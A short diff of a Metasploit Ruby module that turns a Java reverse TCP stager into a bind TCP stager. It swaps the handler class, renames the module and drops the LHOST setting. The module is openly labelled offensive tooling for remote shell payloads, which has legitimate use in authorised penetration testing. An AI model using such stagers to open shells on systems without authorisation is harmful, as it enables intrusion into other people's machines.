@@ -1,5 +1,5 @@
 ##
-# $Id$
+# $Id: reverse_tcp.rb 9927 2010-07-25 19:14:00Z jduck $
 ##
 
 ##
@@ -10,7 +10,7 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
+require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
@@ -20,9 +20,9 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Java Reverse TCP stager',
-			'Version'       => '$Revision$',
-			'Description'   => 'Connect back stager',
+			'Name'          => 'Java Bind TCP stager',
+			'Version'       => '$Revision: 9927 $',
+			'Description'   => 'Listen for a connection',
 			'Author'        => [
 					'mihi',  # all the hard work
 					'egypt', # msf integration
@@ -30,7 +30,7 @@ module Metasploit3
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'java',
 			'Arch'          => ARCH_JAVA,
-			'Handler'       => Msf::Handler::ReverseTcp,
+			'Handler'       => Msf::Handler::BindTcp,
 			'Stager'        => {'Payload' => ""}
 			))
 	end
@@ -43,7 +43,6 @@ module Metasploit3
 	def generate_jar
 		config =  ""
 		#config << "Spawn=2\n"
-		config << "LHOST=#{datastore["LHOST"]}\n" if datastore["LHOST"]
 		config << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
 
 		tcp_stager_jar(config)
